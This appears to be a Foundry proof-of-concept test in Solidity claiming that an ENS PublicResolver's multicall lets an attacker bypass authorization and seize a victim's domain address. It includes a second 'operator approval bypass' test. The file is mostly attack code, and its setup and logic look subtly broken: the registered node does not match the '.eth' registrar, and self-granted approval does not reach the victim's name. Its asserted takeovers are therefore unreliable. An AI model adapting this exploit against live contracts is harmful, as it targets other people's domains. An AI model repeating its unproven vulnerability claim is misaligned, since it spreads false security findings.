// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../contracts/PublicResolver.sol";
import "../contracts/ENSRegistry.sol";
import "../contracts/NameWrapper.sol";
import "../contracts/BaseRegistrarImplementation.sol";

contract POC_Path01_DirectAuthorizationBypass is Test {
    ENS public ens;
    PublicResolver public resolver;
    NameWrapper public nameWrapper;
    BaseRegistrarImplementation public registrar;

    address public attacker = address(0x1337);
    address public victim = address(0xdead);
    bytes32 public testNode = keccak256(abi.encodePacked(bytes32(0), keccak256("test")));

    function setUp() public {
        // Deploy contracts
        ens = new ENS();
        ens.setOwner(bytes32(0), address(this));

        registrar = new BaseRegistrarImplementation(ens, address(0));

        nameWrapper = new NameWrapper(
            ens,
            registrar,
            IMetadataService(address(0))
        );

        resolver = new PublicResolver(
            ens,
            nameWrapper,
            address(this), // trustedETHController
            address(this)  // trustedReverseRegistrar
        );

        // Setup test domain
        ens.setSubnodeOwner(bytes32(0), keccak256("eth"), address(registrar));
        registrar.addController(address(this));

        // Register test domain
        registrar.register(uint256(testNode), victim, 365 days);

        // Set resolver for the domain
        ens.setResolver(testNode, address(resolver));

        // Victim sets up their address
        vm.prank(victim);
        resolver.setAddr(testNode, victim);
    }

    function test_Path01_DirectAuthorizationBypass() public {
        // Verify initial state
        assertEq(resolver.addr(testNode), victim);

        // Attacker attempts direct setAddr call (should fail)
        vm.prank(attacker);
        vm.expectRevert(); // Should fail due to authorization
        resolver.setAddr(testNode, attacker);

        // Verify state unchanged
        assertEq(resolver.addr(testNode), victim);

        // Attacker uses multicall to bypass authorization
        bytes[] memory calls = new bytes[](1);
        calls[0] = abi.encodeCall(resolver.setAddr, (testNode, attacker));

        vm.prank(attacker);
        resolver.multicall(calls);

        // Verify bypass successful - attacker now controls the domain
        assertEq(resolver.addr(testNode), attacker);
    }

    function test_Path01_OperatorApprovalBypass() public {
        // Attacker first grants themselves operator approval via multicall
        bytes[] memory setupCalls = new bytes[](2);
        setupCalls[0] = abi.encodeCall(resolver.setApprovalForAll, (attacker, true));
        setupCalls[1] = abi.encodeCall(resolver.approve, (testNode, attacker, true));

        vm.prank(attacker);
        resolver.multicall(setupCalls);

        // Now attacker can use multicall to set address via operator privileges
        bytes[] memory attackCalls = new bytes[](1);
        attackCalls[0] = abi.encodeCall(resolver.setAddr, (testNode, attacker));

        vm.prank(attacker);
        resolver.multicall(attackCalls);

        // Verify bypass successful
        assertEq(resolver.addr(testNode), attacker);
    }
}